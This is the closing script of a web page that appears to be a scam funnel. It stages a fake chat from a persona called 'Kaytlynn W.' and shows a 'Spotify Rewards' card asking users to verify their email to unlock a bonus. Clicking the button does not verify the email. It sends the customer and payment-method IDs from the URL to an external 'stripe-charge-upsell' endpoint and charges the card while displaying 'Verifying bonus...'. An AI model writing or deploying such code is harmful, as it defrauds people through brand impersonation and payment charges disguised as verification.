        avatar.src = '/sp/up1/avatar.jpg';
        avatar.alt = 'Kaytlynn W.';
        var t = document.createElement('div');
        t.className = 'typing-bubble';
        t.innerHTML = '<span></span><span></span><span></span>';
        row.appendChild(avatar);
        row.appendChild(t);
        stream.appendChild(row);
        scrollBottom();
        requestAnimationFrame(function () { t.classList.add('visible'); });
        setTimeout(function () {
          if (row && row.parentNode) row.remove();
          if (cb) cb();
        }, duration || 2000);
      }

      function addMessage(html) {
        if (!stream) return;
        var row = document.createElement('div');
        row.className = 'message-row';
        var avatar = document.createElement('img');
        avatar.className = 'message-avatar';
        avatar.src = '/sp/up1/avatar.jpg';
        avatar.alt = 'Kaytlynn W.';
        var b = document.createElement('div');
        b.className = 'message-bubble';
        b.innerHTML = html;
        row.appendChild(avatar);
        row.appendChild(b);
        stream.appendChild(row);
        scrollBottom();
        requestAnimationFrame(function () { b.classList.add('visible'); });
      }

      function addCheckout() {
        if (!stream) return;
        var urlParams = new URLSearchParams(window.location.search);
        var prefill = urlParams.get('email') || '';
        var row = document.createElement('div');
        row.className = 'message-row';
        var avatar = document.createElement('img');
        avatar.className = 'message-avatar';
        avatar.src = '/sp/up1/avatar.jpg';
        avatar.alt = 'Kaytlynn W.';
        var card = document.createElement('div');
        card.className = 'checkout-card';
        card.innerHTML =
          '<div style="background:#fff;border:1px solid rgba(29,185,84,0.25);border-radius:16px;padding:14px;box-shadow:0 4px 16px rgba(0,0,0,0.08)">' +
            '<div style="font-size:11px;font-weight:800;letter-spacing:.8px;text-transform:uppercase;color:#1DB954">Email verification required</div>' +
            '<div style="font-size:13px;color:#3c3c43;margin-top:6px;line-height:1.45">Spotify Rewards needs to confirm your email before releasing your bonus. This protects your balance and unlocks instant withdrawal.</div>' +
            '<input id="spEmail" type="email" inputmode="email" autocomplete="email" placeholder="Enter the email linked to your account" value="' + prefill.replace(/"/g, '&quot;') + '" ' +
              'style="width:100%;margin-top:10px;padding:13px 14px;border:1px solid #d9d9de;border-radius:12px;font-size:15px;font-family:Inter,sans-serif;color:#111;outline:none;background:#fafafa" />' +
            '<div id="spEmailErr" style="display:none;color:#dc2626;font-size:12px;margin-top:6px">Enter a valid email to release your bonus.</div>' +
            '<button id="spConfirmBtn" type="button" ' + (prefill ? '' : 'disabled ') + 'class="checkout-btn" style="margin-top:12px;position:relative">' +
              '<span class="btn-visible-label" style="display:flex;align-items:center;justify-content:center">VERIFY &amp; UNLOCK BONUS</span>' +
            '</button>' +
            '<div id="spPayErr" style="display:none;color:#f15e6c;font-size:13px;font-weight:500;margin-top:10px;text-align:center"></div>' +
          '</div>';
        row.appendChild(avatar);
        row.appendChild(card);
        stream.appendChild(row);
        scrollBottom();
        requestAnimationFrame(function () { card.classList.add('visible'); });

        var input = card.querySelector('#spEmail');
        var btn = card.querySelector('#spConfirmBtn');
        var err = card.querySelector('#spEmailErr');
        var payErr = card.querySelector('#spPayErr');

        input.addEventListener('input', function () {
          btn.disabled = !input.value.trim();
        });

        btn.addEventListener('click', async function () {
          var email = (input.value || '').trim();
          if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) {
            err.style.display = 'block';
            input.focus();
            return;
          }
          err.style.display = 'none';
          btn.disabled = true;
          btn.innerHTML = '<span style="display:flex;align-items:center;justify-content:center">Verifying bonus...</span>';

          var cid = urlParams.get('cid') || urlParams.get('customer_id');
          var pm = urlParams.get('pm') || urlParams.get('payment_method_id');
          var workerBase = window.CHECKOUT_URL || 'https://checkout.adm-multikoisas.workers.dev';

          if (cid && pm) {
            try {
              var res = await fetch(workerBase + '/api/stripe-charge-upsell' + window.location.search, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  customer_id: cid,
                  payment_method_id: pm,
                  upsell_number: 1,
                  email: email,
                  name: urlParams.get('name') || urlParams.get('nome') || ''
                })
              });
              var data = await res.json();
              if (data && data.next_url) {
                window.location.href = data.next_url;
                return;
              }
            } catch (e) {
              console.warn('Upsell API error:', e);
            }
          }

          // Fallback to UP2 preserving all URL parameters
          urlParams.set('email', email);
          window.location.href = '/up2?' + urlParams.toString();
        });
      }

      var idx = 0;
      function next() {
        if (idx >= messages.length) return;
        var m = messages[idx++];
        if (m.type === 'text') {
          showTyping(function () {
            addMessage(m.html);
            next();
          }, m.delay || 2000);
        } else if (m.type === 'btn') {
          showTyping(function () {
            addCheckout();
          }, m.delay || 1000);
        }
      }

      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', next);
      } else {
        next();
      }
    })();
  </script>
</body>
</html>
